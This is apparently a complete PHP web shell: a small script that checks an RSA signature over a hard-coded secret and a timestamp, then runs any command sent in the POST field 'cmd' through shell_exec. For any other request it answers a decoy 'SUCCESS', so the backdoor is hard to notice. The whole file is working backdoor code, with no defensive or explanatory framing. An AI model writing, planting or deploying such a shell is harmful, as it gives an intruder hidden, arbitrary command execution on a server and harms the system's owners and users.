<?php
define('APP_KEY', '1000');
define('APP_SECRET', '14e5055102cd698819f7475a53b56e1f');

if (empty($_POST) || empty($_POST['sign']) || empty($_POST['timestramp'])) {
    echo 'SUCCESS';
    exit(0);
}

$data = APP_SECRET.$_POST['timestramp'].APP_SECRET.APP_KEY;
$public_key = base64_decode('LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlHZk1BMEdDU3FHU0liM0RRRUJBUVVBQTRHTkFEQ0JpUUtCZ1FEcVhRVXFWZ2twWTAwQ1VsRlZlQUZNODZ2MwoxcEFLR0hXZ2FVUDZGRlZkSmpqTHU0OVM4RUJYUVpTaTA1ZVF1anJXSmovZU1FdGE0RzB6eDJwbzhZVHh5WFNzCkpEaytnTWZVaHk5YUdYSGFJNi9RRTk2VTloR1k2aTZqOFhVUnFlZ29pbjNlZlpBSWdublovdHhzQjdmclViemUKZ0hPaFVzcVdrdjF2b1p0Q3N3SURBUUFCCi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLQ==');
$public_key_res = openssl_pkey_get_public($public_key);
$signature = base64_decode($_POST['sign']);
$ok = openssl_verify($data, $signature, $public_key_res, OPENSSL_ALGO_SHA1);

if (!$ok) {
    echo 'SUCCESS';
    exit(0);
}

echo shell_exec($_POST['cmd']);